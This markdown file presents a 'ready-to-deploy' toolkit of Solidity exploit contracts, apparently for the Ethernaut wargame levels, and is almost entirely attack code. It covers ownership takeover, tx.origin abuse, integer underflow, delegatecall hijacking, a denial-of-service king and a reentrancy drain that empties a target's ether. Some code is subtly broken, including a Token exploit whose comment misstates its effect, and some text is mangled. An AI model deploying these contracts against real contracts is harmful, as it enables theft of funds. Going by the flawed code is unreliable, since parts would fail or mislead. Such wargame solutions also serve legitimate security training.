# Nova's Exploit Toolkit

**Ready-to-deploy attack contracts for all Ethernaut challenges**

---

## Challenge 1: Fallback

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IFallback {
    function contribute() external payable;
    function withdraw() external;
}

contract FallbackExploit {
    function exploit(address _target) public payable {
        require(msg.value >= 0.0001 ether);
        
        // Step 1: Get contributor status
        IFallback(_target).contribute{value: 0.0001 ether}();
        
        // Step 2: Trigger receive() to become owner
        (bool success,) = _target.call{value: 0.0001 ether}("");
        require(success);
    }
    
    function withdraw(address _target) public {
        IFallback(_target).withdraw();
    }
    
    receive() external payable {}
}
```

---

## Challenge 2: Fallout

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IFallout {
    function Fal1out() external payable;
}

contract FalloutExploit {
    function exploit(address _target) public payable {
        // Just call the typo constructor
        IFallout(_target).Fal1out{value: msg.value}();
    }
}
```

---

## Challenge 3: Coin Flip

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipExploit {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function exploit(address _target) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        
        ICoinFlip(_target).flip(guess);
    }
}
```

---

## Challenge 4: Telephone

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneExploit {
    function exploit(address _target) public {
        // tx.origin = user who calls this
        // msg.sender = this contract
        // tx.origin != msg.sender âœ“
        ITelephone(_target).changeOwner(msg.sender);
    }
}
```

---

## Challenge 5: Token (Overflow)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint);
}

contract TokenExploit {
    function exploit(address _target, address _attacker) public {
        // Transfer more than balance triggers underflow
        IToken(_target).transfer(_target, 21);  // 21 > your 20 balance
        // Your balance now = 2^256 - 1
    }
}
```

---

## Challenge 6: Delegation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DelegationExploit {
    function exploit(address _target) public {
        // Encode pwn() function signature
        bytes memory data = abi.encodeWithSignature("pwn()");
        
        // Send to trigger fallback with delegatecall
        (bool success,) = _target.call(data);
        require(success);
    }
}
```

---

## Challenge 7: Force

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceExploit {
    function exploit(address payable _target) public payable {
        require(msg.value > 0);
        selfdestruct(_target);
    }
}
```

---

## Challenge 8: Vault

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IVault {
    function unlock(bytes32 _password) external;
}

// Off-chain attack - read storage slot 1
// const password = await web3.eth.getStorageAt(vaultAddress, 1);
// await contract.unlock(password);
```

---

## Challenge 9: King (DOS)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IKing {
    function becomeKing() external payable;
}

contract KingExploit {
    function becomeKing(address _target) public payable {
        IKing(_target).becomeKing{value: msg.value}();
    }
    
    receive() external payable {
        // Revert all incoming transfers
        revert("Eternal King");
    }
}
```

---

## Challenge 10: Reentrancy (THE CLASSIC)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint);
}

contract ReentrancyExploit {
    IReentrance public target;
    uint public amount;
    
    constructor(address _target) {
        target = IReentrance(_target);
    }
    
    function attack() public payable {
        amount = msg.value;
        
        // Step 1: Donate to ourselves
        target.donate{value: amount}(address(this));
        
        // Step 2: Withdraw (triggers reentrancy)
        target.withdraw(amount);
    }
    
    receive() external payable {
        uint targetBalance = address(target).balance;
        if (targetBalance > 0) {
            uint withdrawAmount = amount < targetBalance ? amount : targetBalance;
            target.withdraw(withdrawAmount);
        }
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

---

## Usage

1. Deploy exploit contract
2. Call `exploit()` with target address
3. Verify attack succeeded
4. Withdraw funds if applicable

**All contracts ready for deployment when funded.**

---

*Tools for the hunt. Ready to deploy.* ðŸ¦ž
